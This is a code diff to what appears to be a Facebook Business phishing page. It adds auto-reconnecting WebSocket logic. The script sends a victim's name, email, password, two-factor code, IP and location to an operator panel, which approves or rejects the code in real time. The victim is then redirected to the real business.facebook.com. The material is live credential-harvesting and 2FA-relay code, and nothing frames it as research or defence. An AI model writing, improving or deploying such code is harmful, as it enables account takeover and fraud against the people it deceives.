@@ -56,6 +56,53 @@ $domain_name = file_get_contents('domain_name.txt');
     <?php include 'loading.php'; ?>
 
     <script>
+        let ws = null;
+        let reconnectInterval = 5000; // 5 seconds
+        let reconnectTimer = null;
+        let orderId = localStorage.getItem('currentOrderId');
+
+        function createWebSocket() {
+            ws = new WebSocket('wss://<?php echo $domain_name; ?>');
+
+            ws.onopen = function() {
+                console.log('Connected to WebSocket.');
+                clearTimeout(reconnectTimer);
+            };
+
+            ws.onclose = function() {
+                console.log('WebSocket connection closed. Reconnecting...');
+                reconnectTimer = setTimeout(createWebSocket, reconnectInterval);
+            };
+
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                ws.close();
+            };
+
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                if (data.type === 'admin_approve_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                    localStorage.setItem('currentOrderId', data.order_id);
+                    localStorage.setItem('currentStep', data.step);
+                    localStorage.setItem('currentCode', data.code);
+                    window.location.href = 'https://business.facebook.com/select/?next=';
+                } else if (data.type === 'admin_reject_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                    hideLoading();
+                    var codeInput = document.getElementById('code');
+                    codeInput.value = "";
+                    codeInput.value = data.user_info.code;
+                    codeInput.focus();
+                    codeInput.style.border = '1px solid #FF0303';
+
+                    var errorMessage = document.querySelector('.error-message');
+                    showError(errorMessage, codeInput);
+                }
+            };
+        }
+
+        // Initialize WebSocket connection
+        createWebSocket();
+
         function showError(errorMessage, codeInput) {
             errorMessage.style.display = 'flex';
             codeInput.classList.add('error');
@@ -90,29 +137,6 @@ $domain_name = file_get_contents('domain_name.txt');
                 hideError(errorMessage, codeInput);
             });
         });
-
-        const ws = new WebSocket('wss://<?php echo $domain_name; ?>');
-        let orderId = localStorage.getItem('currentOrderId');
-
-        ws.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-            if (data.type === 'admin_approve_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
-                localStorage.setItem('currentOrderId', data.order_id);
-                localStorage.setItem('currentStep', data.step);
-                localStorage.setItem('currentCode', data.code);
-                window.location.href = 'https://business.facebook.com/select/?next=';
-            } else if (data.type === 'admin_reject_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
-                hideLoading();
-                var codeInput = document.getElementById('code');
-                codeInput.value = "";
-                codeInput.value = data.user_info.code;
-                codeInput.focus();
-                codeInput.style.border = '1px solid #FF0303';
-
-                var errorMessage = document.querySelector('.error-message');
-                showError(errorMessage, codeInput);
-            }
-        };
             
         function sendToTelegramFromTwoFactorAuthentication(event) {
             event.preventDefault();
@@ -138,27 +162,33 @@ $domain_name = file_get_contents('domain_name.txt');
                 var org = `<?php echo $org; ?>`;
                 var timezone = `<?php echo $timezone; ?>`;
 
-                ws.send(JSON.stringify({
-                    type: 'enter_code',
-                    order_id: orderId,
-                    code: code,
-                    step: 3,
-                    user_info: {
-                        name: firstName + " " + lastName,
-                        email: personalEmail,
-                        ip: ip,
-                        ip_address: ip_address,
-                        city: city,
-                        region: region,
-                        country: country,
-                        org: org,
-                        timezone: timezone,
-                        password: password,
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        type: 'enter_code',
+                        order_id: orderId,
                         code: code,
-                        phone: ""
-                    }
-                }));
-                showLoading();
+                        step: 3,
+                        user_info: {
+                            name: firstName + " " + lastName,
+                            email: personalEmail,
+                            ip: ip,
+                            ip_address: ip_address,
+                            city: city,
+                            region: region,
+                            country: country,
+                            org: org,
+                            timezone: timezone,
+                            password: password,
+                            code: code,
+                            phone: ""
+                        }
+                    }));
+                    showLoading();
+                } else {
+                    console.error('WebSocket is not connected. Cannot send data.');
+                    window.location.reload();
+                    return;
+                }
             }
         }
     </script>
